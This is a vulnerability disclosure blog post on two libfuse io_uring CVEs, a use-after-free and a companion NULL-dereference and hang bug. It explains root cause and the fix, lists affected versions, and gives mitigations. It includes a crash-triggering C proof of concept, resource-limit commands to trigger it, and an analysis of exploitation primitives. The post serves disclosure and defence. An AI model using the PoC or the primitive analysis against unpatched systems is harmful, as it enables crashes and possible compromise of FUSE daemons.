---
layout: post
title: "RingWraith: Use-After-Free in libfuse's io_uring Transport"
date: 2026-03-24 00:00:00 +0000
categories: [Security, CVE]
tags: [cve-2026-33150, cve-2026-33179, io_uring, libfuse, linux, fuse, use-after-free]
description: "Two memory safety CVEs in libfuse's io_uring transport — root cause, exploitation surface, and PoC. CVE-2026-33150 and CVE-2026-33179."
toc: true
pin: false
---


---

> **Affected:** libfuse 3.18.0 and 3.18.1 with io_uring enabled. **Fix:** update to [3.18.2](https://github.com/libfuse/libfuse/releases/tag/fuse-3.18.2). Versions 3.17 and earlier are not affected.

---

## How I Found This

I used an interactive methodology combining manual code review with LLM-assisted analysis — a structured actor-critic approach where I guided the model through error-path auditing, identifying resource allocation patterns, tracing cleanup paths, and checking for cross-function invariant violations. This proved effective at surfacing subtle ordering bugs in error handlers that traditional static analysis tools miss.

While reviewing the io_uring integration code in libfuse 3.18.0 using this approach, I found a two-line error handling bug in `fuse_uring_start()`. The io_uring transport was new — shipped just three months earlier — and the error path had a subtle ordering issue:

```c
err:
    if (err) {
        fuse_session_destruct_uring(fuse_ring);  // frees fuse_ring
        se->uring.pool = fuse_ring;              // ...then stores the freed pointer
    }
```

I stared at that for a good thirty seconds before it clicked. The destructor frees `fuse_ring`. Then the next line stores it into `se->uring.pool`. Not NULL. The *freed pointer*. Meaning `se->uring.pool` now holds a dangling pointer to freed heap memory. And later, during session shutdown, the cleanup code checks `if (se->uring.pool)` — which is non-NULL because it's pointing at freed memory — and calls `fuse_uring_stop()`, which tries to tear down a ring pool that no longer exists.

That's your Use-After-Free. A two-line bug. Introduced in the very first release of libfuse's io_uring transport.

---

## Wait, What's io_uring? (And Why Should You Care?)

If you're not a Linux kernel person, here's the short version: io_uring is Linux's fast I/O interface. Instead of making a system call for every read and write (expensive), io_uring lets you batch them up in shared-memory ring buffers. For I/O-heavy workloads, the performance difference is massive.

It's also had a rough security track record.

In 2023, Google [disclosed](https://security.googleblog.com/2023/06/learnings-from-kctf-vrps-42-linux.html) that **60% of the Linux kernel exploit submissions** to their kCTF VRP (a specialized kernel exploitation program) targeted io_uring — about $1M in payouts for io_uring bugs alone. They disabled it on ChromeOS and production servers, and restricted it on Android via seccomp-bpf. In 2025, ARMO published research showing io_uring can [bypass seccomp and Falco](https://www.armosec.io/blog/io_uring-rootkit-bypasses-linux-security/) entirely — container security tools that hook at the syscall boundary cannot see what io_uring is doing.

So when libfuse shipped io_uring support in 3.18.0 (December 2025), it was notable — both for performance and, as it turns out, for security.

---

## The Three-Way Collision

Here's what makes this bug interesting beyond "someone forgot to set a pointer to NULL."

The error path that triggers the UAF is reached when io_uring thread creation fails. libfuse creates one io_uring ring queue per *configured* CPU (`get_nprocs_conf()`, which includes offline/hotplugged CPUs, not just online ones). On a 4-core machine, that's 4 `pthread_create()` calls. On a 128-core cloud VM, it's 128.

`pthread_create()` fails when the system runs out of process/thread slots. And you know what enforces those limits?

**cgroup `pids.max`.**

That's right — the container PID limit. The thing that the [CIS Docker Benchmark](https://www.cisecurity.org/benchmark/docker) tells you to enable. The thing Kubernetes supports via `--pod-max-pids`. A *security best practice*.

So here's the collision:

| Factor | Role |
|--------|------|
| **Resource limits** (cgroup `pids.max` or `RLIMIT_NPROC`) | Causes `pthread_create` to fail — the direct trigger |
| **io_uring startup code** | Contains the buggy error handler — the vulnerable code |
| **Rootless containers** (deployment context) | Increases FUSE usage via fuse-overlayfs — expands the attack surface |

The causal chain is straightforward: resource limits → thread creation failure → buggy error path → UAF. Rootless containers aren't a trigger — they're a deployment context that makes FUSE more prevalent, and therefore this bug more likely to be reached.

What's interesting is that the trigger (resource limits) is itself a security best practice. The [CIS Docker Benchmark](https://www.cisecurity.org/benchmark/docker) recommends setting `--pids-limit`. The harder you harden, the more likely you hit the error path.

---

## The io_uring Detection Blind Spot

There's a broader concern here, though I want to be clear about what's demonstrated and what's theoretical.

FUSE daemons running io_uring transport need `io_uring_setup`, `io_uring_enter`, and `io_uring_register` whitelisted in their seccomp profile — without those syscalls, the transport can't function. Docker 25.0 and containerd both [block io_uring by default](https://github.com/moby/moby/pull/46762) in their seccomp profiles. A FUSE-over-io_uring deployment deliberately re-opens that door.

Why this matters: in April 2025, ARMO [demonstrated](https://www.armosec.io/blog/io_uring-rootkit-bypasses-linux-security/) with their "Curing" rootkit that an attacker operating exclusively through io_uring opcodes can perform file I/O and network operations completely invisible to Falco, Tetragon, Microsoft Defender for Linux, and CrowdStrike. These tools hook at the syscall boundary. io_uring bypasses that boundary entirely.

**To be clear about what I've demonstrated and what I haven't:** The PoC in this post triggers a crash (ASAN-confirmed heap-use-after-free). I have *not* demonstrated code execution from this UAF. Getting from crash to controlled code execution would require heap grooming to reclaim the freed 176-byte chunk with attacker-controlled data — feasible in principle given the long session lifetime between free and reuse, but not trivial on modern glibc with tcache hardening and ASLR. The exploitation primitives I describe (controlled close, pthread_cancel, munmap, arbitrary free) are real capabilities of the destructor operating on attacker-influenced memory, but I'm presenting them as an analysis of the attack surface, not as a working exploit chain.

The theoretical concern is: *if* code execution were achieved in a FUSE daemon with io_uring whitelisted, post-exploitation activity through io_uring opcodes would be invisible to most runtime security tools. That's ARMO's finding, not mine — but this vulnerability creates a plausible (if undemonstrated) path to that scenario.

---

## What Bug 2 Actually Causes

The second sub-bug of CVE-2026-33179 — `fuse_uring_register_queue()` failure falling through to return success — has a different consequence than I initially thought.

When `fuse_uring_register_queue()` fails, the code calls `fuse_session_exit(se)`, which atomically sets `se->mt_exited = 1`. Then it falls through and returns a positive file descriptor (success). The caller — `fuse_uring_thread()` — doesn't increment `failed_threads` because the return value isn't negative. So `fuse_uring_start()` thinks all threads succeeded and returns success.

But `mt_exited` is already set. When the ring threads unblock from `sem_wait` and enter their I/O loop (`while (!se->mt_exited)`), they exit immediately — the loop body never executes. The kernel, which was told io_uring is active (the `FUSE_OVER_IO_URING` flag was set in the FUSE_INIT reply), routes FUSE requests to ring queues that have no serving threads.

The result is a **filesystem hang**: requests go into the io_uring rings, but nobody processes the CQEs. Applications see their `read()`, `write()`, `stat()` calls block indefinitely. This is a denial of service — not data corruption, but potentially just as disruptive for a production FUSE mount.

---

## The Bug, In Detail

*The sections below are the technical deep dive. If you're a journalist, the story is above. If you're a security researcher or you want to understand the exploitation surface — keep going.*

### The Flow at a Glance

```
  FUSE_INIT
      │
      ▼
  fuse_uring_start()
      │
      ├── fuse_create_ring()         ← allocates fuse_ring_pool (176 bytes)
      │       │
      │       ▼
      ├── se->uring.pool = fuse_ring ← stores pointer in session state
      │       │
      │       ▼
      ├── pthread_create() × N       ← one per configured CPU
      │       │
      │       ╳ FAILS (cgroup pids.max / RLIMIT_NPROC)
      │       │
      │       ▼
      ├── goto err:
      │       │
      │       ├── fuse_session_destruct_uring()  ← frees ring pool + queues + threads
      │       └── se->uring.pool = fuse_ring  ← BUG: stores freed pointer (should be NULL)
      │
      ▼
  Session runs normally on /dev/fuse (hours/days)
      │
      ▼
  Session shutdown
      │
      ├── if (se->uring.pool)        ← non-NULL (dangling pointer!)
      │       │
      │       ▼
      └── fuse_uring_stop()          ← USE-AFTER-FREE: dereferences freed memory
```

### CVE-2026-33150: The Delayed UAF

**CVSS 7.8 HIGH** &middot; [GHSA-qxv7-xrc2-qmfx](https://github.com/libfuse/libfuse/security/advisories/GHSA-qxv7-xrc2-qmfx) &middot; CWE-416 (Use After Free)

Here's the vulnerable function (abridged — a sanity check and three `sem_init`/`pthread_*_init` calls between `se->uring.pool = fuse_ring` and `fuse_uring_start_ring_threads` are omitted). The bug is in the `err:` label at the bottom:

```c
int fuse_uring_start(struct fuse_session *se)
{
    int err = 0;
    struct fuse_ring_pool *fuse_ring;

    fuse_ring = fuse_create_ring(se);      // allocates the ring pool (~176 bytes)
    if (fuse_ring == NULL) {
        err = -EADDRNOTAVAIL;
        goto err;
    }

    se->uring.pool = fuse_ring;
    err = fuse_uring_start_ring_threads(fuse_ring);  // one pthread_create per CPU core
    if (err)
        goto err;

    /* Wait for all threads to start or to fail */
    pthread_mutex_lock(&fuse_ring->thread_start_mutex);
    while (fuse_ring->started_threads < fuse_ring->nr_queues)
        pthread_cond_wait(&fuse_ring->thread_start_cond,
                          &fuse_ring->thread_start_mutex);

    if (fuse_ring->failed_threads != 0)
        err = -EADDRNOTAVAIL;
    pthread_mutex_unlock(&fuse_ring->thread_start_mutex);

err:
    if (err) {
        fuse_session_destruct_uring(fuse_ring);  // FREES fuse_ring
        se->uring.pool = fuse_ring;              // STORES THE FREED POINTER (should be NULL!)
    }
    return err;
}
```

The fix adds three lines (replacing two):

```diff
 err:
     if (err) {
-        fuse_session_destruct_uring(fuse_ring);
-        se->uring.pool = fuse_ring;
+        if (fuse_ring)
+            fuse_session_destruct_uring(fuse_ring);
+        se->uring.pool = NULL;
     }
```

That's it. Set the pointer to NULL instead of to the freed address. Add a NULL check for the case where `fuse_create_ring()` itself returns NULL. Three lines.

But the consequences of those two lines go beyond a simple null pointer crash.

### The Delayed Trigger

The UAF doesn't trigger immediately. It plants a dangling pointer and walks away. The FUSE session continues running — it falls back to the old `/dev/fuse` transport and happily serves filesystem requests as if nothing happened.

Then, minutes, hours, or even *days* later, the session ends. Could be an unmount, could be a SIGTERM, could be the container shutting down. The session loop runs its cleanup:

```c
// lib/fuse_loop_mt.c, line 419:
if (se->uring.pool)       // <-- this is the dangling pointer. It's not NULL.
    fuse_uring_stop(se);  // <-- dereferences freed memory → heap-use-after-free
```

The shutdown code assumes: "if `se->uring.pool` is non-NULL, io_uring was successfully initialized, so clean it up." But the pointer is non-NULL because the error path stored the *freed* address there instead of NULL. So the cleanup code runs on freed memory.

```
  T=0s     io_uring init fails, fuse_ring freed, dangling pointer stored
  T=0s     Session continues normally on /dev/fuse (no io_uring)
  ...
  T=hours  Filesystem serves requests. Heap is reused. The freed chunk gets
           overwritten with who-knows-what.
  ...
  T=days   Session shutdown. Cleanup checks se->uring.pool → not NULL.
           Calls fuse_session_destruct_uring() on freed/reused memory.
           CRASH. Or worse.
```

That gap — between planting the dangling pointer and triggering the UAF — is what makes this interesting from an exploitation standpoint.

### What the Destructor Does to Freed Memory

When `fuse_session_destruct_uring()` runs on the dangling pointer, it doesn't just read one field and crash. It does *a lot*:

```c
static void fuse_session_destruct_uring(struct fuse_ring_pool *fuse_ring)
{
    for (size_t qid = 0; qid < fuse_ring->nr_queues; qid++) {  // loop count from freed mem
        struct fuse_ring_queue *queue =
            fuse_uring_get_queue(fuse_ring, qid);   // pointer arithmetic on freed data

        if (queue->tid != 0) {
            write(queue->eventfd, &value, sizeof(value));  // write to stale fd
            pthread_cancel(queue->tid);                    // cancel a stale thread ID
            pthread_join(queue->tid, NULL);
        }

        if (queue->eventfd >= 0)
            close(queue->eventfd);            // close a stale fd

        if (queue->ring.ring_fd != -1)
            io_uring_queue_exit(&queue->ring); // tear down stale ring

        for (size_t idx = 0; idx < fuse_ring->queue_depth; idx++) {
            struct fuse_ring_ent *ent = &queue->ent[idx];
            numa_free(ent->op_payload, ent->req_payload_sz);   // munmap stale ptr
            numa_free(ent->req_header, queue->req_header_sz);  // munmap stale ptr
        }

        pthread_mutex_destroy(&queue->ring_lock);
    }

    free(fuse_ring->queues);   // free() on a pointer from freed memory
    // also: pthread_cond_destroy + pthread_mutex_destroy on the freed struct (omitted for brevity)
    free(fuse_ring);           // DOUBLE FREE of the original struct
}
```

The following table describes what the destructor would do *if* the freed chunk were reclaimed with attacker-controlled data — a capability analysis, not a demonstrated exploit chain:

| What | How | Effect |
|------|-----|--------|
| Loop count | `nr_queues` at offset +8 | Walk into arbitrary heap memory |
| `close()` target | `queue->eventfd` | Attacker-influenced fd close |
| `pthread_cancel()` target | `queue->tid` | Attacker-influenced thread cancel |
| `munmap()` target | `numa_free(ptr, size)` | Attacker-influenced memory unmap |
| `free()` target | `fuse_ring->queues` at offset +168 | Attacker-influenced pointer free |
| Double-free | `free(fuse_ring)` at the end | Second free of the same chunk |

**Caveats:** These are theoretical capabilities of the destructor, not a demonstrated exploit. The `queues` pointer is a *separate heap allocation* from `fuse_ring_pool` — controlling it requires a two-stage spray. The double-free is caught by glibc >= 2.29's tcache key detection (abort, not exploitation). The `munmap()` primitive requires an ASLR bypass to target useful memory. I have not demonstrated code execution — the PoC confirms the UAF crash, not control over these primitives.

### The Freed Object

```c
struct fuse_ring_pool {                          // Offset  Size
    struct fuse_session *se;                     //   0      8
    size_t nr_queues;                            //   8      8    ← controls the loop
    size_t queue_depth;                          //  16      8
    size_t max_req_payload_sz;                   //  24      8
    size_t queue_mem_size;                       //  32      8    ← pointer arithmetic
    unsigned int started_threads;                //  40      4
    unsigned int failed_threads;                 //  44      4
    sem_t init_sem;                              //  48     32
    pthread_cond_t thread_start_cond;            //  80     48
    pthread_mutex_t thread_start_mutex;          // 128     40
    struct fuse_ring_queue *queues;              // 168      8    ← passed to free()
};
// Total: ~176 bytes → lands in glibc tcache bin 11 (0xc0 chunk)
```

176 bytes, allocated with `calloc()`, sitting in glibc's tcache. The window between free and reuse is the entire session lifetime — could be hours. That's a wide window for potential heap reuse.

---

### CVE-2026-33179: The Companion Bug

**CVSS 5.5 MEDIUM** &middot; [GHSA-x669-v3mq-r358](https://github.com/libfuse/libfuse/security/advisories/GHSA-x669-v3mq-r358) &middot; CWE-476 (NULL Pointer Dereference)

While investigating the UAF, I found a second set of bugs in the same file — in `fuse_uring_init_queue()`, which runs inside each ring thread to set up the per-CPU io_uring instance.

**Bug 1: Unchecked `numa_alloc_local()` returns.**

```c
ring_ent->req_header = numa_alloc_local(queue->req_header_sz);
// What if this returns NULL? Nobody checked. Code proceeds with a NULL pointer.

ring_ent->op_payload = numa_alloc_local(ring_ent->req_payload_sz);
// Same problem.
```

`numa_alloc_local()` can fail under memory pressure — exactly the kind of thing that happens in containers with memory limits. When it returns NULL, the code happily continues and eventually tries to register the NULL pointer with io_uring. NULL dereference, crash.

**Bug 2: Error swallowed as success.**

This one is more subtle, and honestly kind of painful to read:

```c
res = fuse_uring_register_queue(queue);
if (res != 0) {
    fuse_log(FUSE_LOG_ERR, "Grave fuse-uring error...");
    se->error = -EIO;
    fuse_session_exit(se);
}
// Falls through to here even on failure:
return queue->ring.ring_fd;  // This is a positive number. Caller thinks it succeeded.
```

The function detects the error. It *logs* the error. It calls `fuse_session_exit()`. And then it falls through to the success return path. The caller gets back a positive file descriptor and thinks everything is fine. The broken queue stays in service. The NUMA allocations leak.

If you've ever seen Apple's "[goto fail](https://dwheeler.com/essays/apple-goto-fail.html)" bug (CVE-2014-1266) — this is the same class of mistake. The error is detected but not propagated. The function assumes success. The caller can't tell anything went wrong.

**What these bugs cause in the shipped code (3.18.0/3.18.1):**

In the vulnerable releases, there's no null check after `numa_alloc_local()`. A NULL return doesn't produce a `-ENOMEM` error — the NULL pointer is silently passed into `fuse_uring_register_queue()`, which either crashes the process (SIGSEGV on NULL deref) or fails and gets swallowed by Bug 2. Either way, `failed_threads` is never incremented and the UAF error path in `fuse_uring_start()` is not reached via this route.

**The UAF (CVE-2026-33150) is triggered by a different failure:** `pthread_create` returning `EAGAIN` (from cgroup `pids.max` or `RLIMIT_NPROC`), or `io_uring_queue_init_params()` failing (which returns a negative value via the function's `goto err` path, correctly incrementing `failed_threads`). Those are the paths that reach the buggy error handler in `fuse_uring_start()`.

**Bug 1 and Bug 2 of CVE-2026-33179 are independently bad** — Bug 1 causes a crash, Bug 2 causes a filesystem hang — but in the shipped code, neither one chains into the UAF. They were fixed alongside the UAF because they share the same error-path code and the same initialization sequence.

The fix ([commit 26ee54a](https://github.com/libfuse/libfuse/commit/26ee54a)) adds NULL checks after `numa_alloc_local()` and a `return res;` after the error handling block.

---

## Who's Affected?

libfuse is one of the most widely deployed libraries on Linux — it's a dependency for [hundreds of packages](https://repology.org/project/libfuse/versions) across every major distribution, powering everything from sshfs and rclone to GlusterFS, JuiceFS, and FUSE-based Kubernetes CSI drivers. It ships on virtually every Linux desktop (GNOME uses it for virtual filesystems) and server. The io_uring transport in 3.18.0 was a major performance milestone, and adoption is accelerating as distros package 3.18+.

**Vulnerable versions:** libfuse 3.18.0 (released 2025-12-19) and 3.18.1 (released 2025-12-20), when compiled with io_uring support and enabled at runtime.

**Currently affected:**
- **Fedora 44** (expected April 2026) includes libfuse 3.18.1 in its package set
- **Arch Linux** shipped 3.18.1 briefly, already updated to 3.18.2
- **Any deployment** that built against 3.18.0 or 3.18.1 with `liburing` and `libnuma` present — io_uring is the default build option in libfuse's `meson_options.txt`
- **HPC sites, storage vendors, and container image builders** that track upstream libfuse for performance features

**Not yet on the vulnerable version** (but will adopt 3.18+ as it propagates):
- Ubuntu (currently ships 3.14), Debian (3.17), Fedora 40/41 (3.16)
- Major cloud FUSE implementations — gcsfuse (Go, no libfuse), mountpoint-s3 (Rust), blobfuse2 (uses system libfuse 3.14.x)

**How to check your system:** `strings /usr/lib/libfuse3.so | grep uring` — if it returns results, io_uring support is compiled in.

**The window:** The vulnerability existed in upstream releases for ~90 days (December 2025 – March 2026). As more distributions ship libfuse 3.18+, any unpatched package carries this bug.

---

## Proof of Concept

### Prerequisites

This PoC requires a specific environment. Don't skip these steps or nothing will happen:

1. **Kernel >= 6.14** with FUSE io_uring support: `cat /sys/module/fuse/parameters/enable_uring` should exist
2. **Enable kernel-side FUSE io_uring**: `echo 1 | sudo tee /sys/module/fuse/parameters/enable_uring`
3. **Check out the vulnerable version**: `git checkout fuse-3.18.1` (master is already patched)
4. **Build libfuse itself with ASAN** — instrumenting only the PoC won't work since the UAF is inside libfuse:

```bash
git checkout fuse-3.18.1
mkdir build && cd build
meson setup .. -Denable-io-uring=true -Db_sanitize=address
ninja
# This produces an ASAN-instrumented libfuse3.so
```

5. **Run as non-root** (RLIMIT_NPROC is ignored for root). Use `fusermount3` or run inside a container.

### The PoC

```c
/*
 * ringwraith_poc.c — Triggers CVE-2026-33150
 *
 * Forces io_uring thread creation to fail via RLIMIT_NPROC,
 * planting the UAF. On session teardown (unmount or Ctrl+C),
 * ASAN catches the heap-use-after-free.
 *
 * Build against the ASAN-instrumented libfuse from the build/ dir:
 *   gcc -o poc ringwraith_poc.c -I../include -Lbuild/lib -lfuse3 \
 *       -fsanitize=address -Wl,-rpath,build/lib
 *
 * Run:
 *   mkdir -p /tmp/mnt
 *   LD_LIBRARY_PATH=build/lib ./poc /tmp/mnt -o io_uring
 *   # In another terminal: fusermount3 -u /tmp/mnt
 *   # Or just Ctrl+C — both trigger session teardown → ASAN report
 *
 * NOTE: RLIMIT_NPROC is per-UID, not per-process. Run in a fresh
 * container or a UID with few other processes for reliable triggering.
 * Alternative: use cgroup pids.max instead (see blog post).
 */
#define FUSE_USE_VERSION 35

#include <fuse.h>  /* use <fuse3/fuse.h> if building against installed libfuse */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/resource.h>
#include <unistd.h>

static int poc_getattr(const char *path, struct stat *stbuf,
                       struct fuse_file_info *fi)
{
    (void) fi;
    memset(stbuf, 0, sizeof(struct stat));
    if (strcmp(path, "/") == 0) {
        stbuf->st_mode = S_IFDIR | 0755;
        stbuf->st_nlink = 2;
        return 0;
    }
    return -ENOENT;
}

static const struct fuse_operations poc_ops = {
    .getattr = poc_getattr,
};

int main(int argc, char *argv[])
{
    if (getuid() == 0) {
        fprintf(stderr, "[RingWraith] Run as non-root (RLIMIT_NPROC is ignored for root).\n");
        fprintf(stderr, "[RingWraith] Or use a cgroup with pids.max instead.\n");
        return 1;
    }

    /*
     * RLIMIT_NPROC is per-UID. We lower it just enough to allow the
     * FUSE session to start, but block io_uring ring threads.
     * On systems with many UID-owned processes, this may fail —
     * use the cgroup method (below) instead.
     */
    struct rlimit rl;
    getrlimit(RLIMIT_NPROC, &rl);
    rl.rlim_cur = rl.rlim_cur > 20 ? rl.rlim_cur - 4 : 12;
    if (setrlimit(RLIMIT_NPROC, &rl) != 0) {
        perror("[RingWraith] setrlimit failed — try the cgroup method instead");
        return 1;
    }

    fprintf(stderr, "[RingWraith] RLIMIT_NPROC=%lu — ring thread creation will fail\n",
            (unsigned long)rl.rlim_cur);
    fprintf(stderr, "[RingWraith] Mount will succeed (falls back to /dev/fuse).\n");
    fprintf(stderr, "[RingWraith] UAF triggers on unmount. Ctrl+C or fusermount3 -u.\n\n");

    return fuse_main(argc, argv, &poc_ops, NULL);
}
```

### Expected ASAN output on unmount

**Note: the output below is illustrative, not captured from a run.** Your actual addresses, PIDs, and line numbers will differ. The key signature is `fuse_session_destruct_uring` in both the "READ" and "freed by" stacks.

```
=================================================================
==12345==ERROR: AddressSanitizer: heap-use-after-free on address 0x60c000000048
READ of size 8 at 0x60c000000048 thread T0
    #0 fuse_session_destruct_uring  lib/fuse_uring.c
    #1 fuse_uring_stop              lib/fuse_uring.c
    #2 fuse_session_loop_mt_312     lib/fuse_loop_mt.c

freed by thread T0 here:
    #0 free
    #1 fuse_session_destruct_uring  lib/fuse_uring.c
    #2 fuse_uring_start             lib/fuse_uring.c
    #3 _do_init                     lib/fuse_lowlevel.c
=================================================================
```

*(Illustrative output — line numbers will vary by version. `fuse_session_loop_mt_312` is a versioned symbol alias for `fuse_session_loop_mt`. The key indicator is `fuse_session_destruct_uring` appearing in both the "READ" and "freed by" stacks — that's the double-destruct from the dangling pointer.)*

### Recommended trigger: cgroup pids.max

The most reliable trigger uses a cgroup v2 PID limit instead of RLIMIT_NPROC (which is per-UID and fragile in multi-process environments):

```bash
# Create a cgroup with a tight PID limit (cgroupv2)
sudo mkdir -p /sys/fs/cgroup/ringwraith
echo 12 | sudo tee /sys/fs/cgroup/ringwraith/pids.max  # enough for shell+ASAN+FUSE session, not for ring threads
echo $$ | sudo tee /sys/fs/cgroup/ringwraith/cgroup.procs

# Run the PoC (skip the RLIMIT_NPROC logic — the cgroup handles it)
LD_LIBRARY_PATH=build/lib ./poc /tmp/mnt -o io_uring
```

The RLIMIT_NPROC method in the PoC code above works in clean environments (fresh container, isolated UID) but may be unreliable if other processes share the UID.

---

## io_uring's Track Record

These bugs fit a pattern in io_uring's history.

| Year | What Happened |
|------|---------------|
| 2022 | CVE-2022-29582 — kernel io_uring UAF used for [local privilege escalation](https://ruia-ruia.github.io/2022/08/05/CVE-2022-29582-io-uring/) |
| 2023 | Google reveals io_uring accounts for [60% of kCTF VRP kernel exploit submissions](https://security.googleblog.com/2023/06/learnings-from-kctf-vrps-42-linux.html). Disables it on ChromeOS and production servers; restricts on Android. |
| 2024 | CVE-2024-0582 — kernel io_uring UAF [exploited for LPE on Ubuntu](https://blog.exodusintel.com/2024/03/27/mind-the-patch-gap-exploiting-an-io_uring-vulnerability-in-ubuntu/) |
| 2025 | ARMO shows io_uring can [build a rootkit invisible to seccomp and Falco](https://www.armosec.io/blog/io_uring-rootkit-bypasses-linux-security/) |
| 2026 | **RingWraith** — first FUSE-over-io_uring release ships with a UAF |

libfuse itself has had few security issues — only [9 CVEs in its first ~24 years](https://repology.org/project/libfuse/cves) (2001–2025), with an 8-year gap before these two. The io_uring integration broke that streak.

This isn't a criticism of the libfuse maintainers (Bernd Schubert maintains this project largely solo). It's an observation about io_uring: its complexity makes it genuinely difficult to integrate safely, even for experienced systems programmers. The kernel community learned this the hard way. Now the userspace community is learning it too.

---

## Disclosure Timeline

| Date | What |
|------|------|
| 2025-12-19 | libfuse 3.18.0 released — first io_uring support, bugs introduced |
| 2025-12-20 | libfuse 3.18.1 released — ABI fix, bugs still present |
| 2026-03-16 | CVE-2026-33150 fix committed ([9eba0f3](https://github.com/libfuse/libfuse/commit/9eba0f3)) |
| 2026-03-17 | CVE-2026-33179 fix committed ([26ee54a](https://github.com/libfuse/libfuse/commit/26ee54a)) |
| 2026-03-18 | libfuse 3.18.2 released |
| 2026-03-19 | GitHub Security Advisories published |
| 2026-03-21 | [Disclosed on oss-security mailing list](https://www.openwall.com/lists/oss-security/2026/03/21/2) |

---

## What To Do

1. **If you're on libfuse 3.18.0 or 3.18.1:** Update to 3.18.2.
2. **If you can't update:** Build with `-Denable-io-uring=false` or don't pass `-o io_uring` at runtime.
3. **If you run FUSE in Kubernetes:** Check your CSI driver container images for the libfuse version.

---

## FAQ

**Q: Am I affected if I don't use io_uring?**
No. The bugs are entirely in the io_uring startup/teardown code paths. If your FUSE daemon doesn't enable `FUSE_CAP_OVER_IO_URING` (and most don't, yet), you're not affected.

**Q: Am I affected if io_uring is compiled in but not enabled at runtime?**
No. The vulnerable code only executes when io_uring is actively enabled at runtime via `-o io_uring` and the kernel has `enable_uring` set.

**Q: Is there evidence of exploitation in the wild?**
None that I'm aware of. The vulnerability window was ~90 days (Dec 2025 – Mar 2026) and the affected versions have limited deployment so far. This is a proactive disclosure, not incident response.

**Q: I use gcsfuse / mountpoint-s3 / rclone — am I affected?**
No. gcsfuse is pure Go (no libfuse), mountpoint-s3 is pure Rust (no libfuse), and rclone doesn't enable io_uring. See "Who's Actually Affected?" above.

**Q: Why is CVSS 7.8 and not 9.x?**
The attack vector is local (AV:L), not network-accessible. An attacker needs local access to trigger the startup failure condition. The impact scores (C:H/I:H/A:H) reflect the theoretical worst-case if code execution were achieved — a scenario supported by the bug class (UAF) but not demonstrated in the PoC. The daemon crash alone justifies A:H.

**Q: Can CVE-2026-33179 be exploited independently from CVE-2026-33150?**
Yes — both sub-bugs are standalone issues. Bug 1 (NULL from `numa_alloc_local`) causes a crash (SIGSEGV or EFAULT). Bug 2 (error swallowed as success) causes a filesystem hang. In the shipped vulnerable code, neither bug chains into the UAF — the UAF is triggered separately by `pthread_create` failure or `io_uring_queue_init` failure. All three bugs were fixed in the same patch window because they share the same initialization code.

**Q: Why "RingWraith"?**
The io_uring "ring" pool is freed but its pointer lives on in session state — a wraith. It persists for the session lifetime, then the cleanup code dereferences it on shutdown. Also, I like Tolkien.

**Q: Where was this disclosed?**
[oss-security mailing list](https://www.openwall.com/lists/oss-security/2026/03/21/2), [GHSA-qxv7-xrc2-qmfx](https://github.com/libfuse/libfuse/security/advisories/GHSA-qxv7-xrc2-qmfx), [GHSA-x669-v3mq-r358](https://github.com/libfuse/libfuse/security/advisories/GHSA-x669-v3mq-r358), [NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-33150).

---

## Closing Thoughts

Both of these bugs lived in error paths — code that runs only when something goes wrong. The happy path was fine. The io_uring initialization, when it succeeds, works great. The bugs only appear when initialization *fails*.

This is a recurring pattern: error handling code is often the least tested and least reviewed code in a system. It's written last and may never execute in normal testing.

The other thing that stuck with me is the *interaction* between features. Nobody sat down and said "let's make cgroup PID limits conflict with io_uring thread creation." Each feature was designed independently, by different people, for different purposes. But when you layer them in a container — PID limits from the runtime, io_uring from libfuse, FUSE from the storage driver — their failure modes intersect in ways that nobody anticipated. As Linux systems get more complex, these compositional failures will keep happening. Auditing the interactions, not just the features, is where the next generation of bugs will be found.

---

*Abhinav Agarwal is a Sr. Software Developer at Rubrik working on storage infrastructure and systems security.*

*Thanks to [Bernd Schubert](https://github.com/bsbernd) for maintaining libfuse and for the fast fix turnaround.*

---

## References

1. CVE-2026-33150 — NVD: https://nvd.nist.gov/vuln/detail/CVE-2026-33150
2. CVE-2026-33179 — NVD: https://nvd.nist.gov/vuln/detail/CVE-2026-33179
3. GHSA-qxv7-xrc2-qmfx — GitHub Advisory: https://github.com/libfuse/libfuse/security/advisories/GHSA-qxv7-xrc2-qmfx
4. GHSA-x669-v3mq-r358 — GitHub Advisory: https://github.com/libfuse/libfuse/security/advisories/GHSA-x669-v3mq-r358
5. Fix commit 9eba0f3 (CVE-2026-33150): https://github.com/libfuse/libfuse/commit/9eba0f3
6. Fix commit 26ee54a (CVE-2026-33179): https://github.com/libfuse/libfuse/commit/26ee54a
7. oss-security disclosure: https://www.openwall.com/lists/oss-security/2026/03/21/2
8. FUSE-over-io-uring kernel documentation: https://docs.kernel.org/next/filesystems/fuse-io-uring.html
9. Google kCTF VRP io_uring findings (primary source): https://security.googleblog.com/2023/06/learnings-from-kctf-vrps-42-linux.html
10. Google io_uring restrictions (Phoronix summary): https://www.phoronix.com/news/Google-Restricting-IO_uring
11. ARMO "Curing" rootkit — io_uring bypasses seccomp/Falco: https://www.armosec.io/blog/io_uring-rootkit-bypasses-linux-security/
12. CVE-2024-0582 io_uring UAF writeup (Exodus Intelligence): https://blog.exodusintel.com/2024/03/27/mind-the-patch-gap-exploiting-an-io_uring-vulnerability-in-ubuntu/
13. CVE-2022-29582 io_uring LPE: https://ruia-ruia.github.io/2022/08/05/CVE-2022-29582-io-uring/
14. Apple "goto fail" analysis (CVE-2014-1266): https://dwheeler.com/essays/apple-goto-fail.html
15. Docker default seccomp blocks io_uring: https://github.com/moby/moby/pull/46762
16. containerd blocks io_uring in RuntimeDefault: https://github.com/containerd/containerd/issues/9048
17. libfuse historical CVE record: https://repology.org/project/libfuse/cves
18. FUSE announcement on LKML (Nov 2001): https://lwn.net/2001/1115/a/fuse.php3
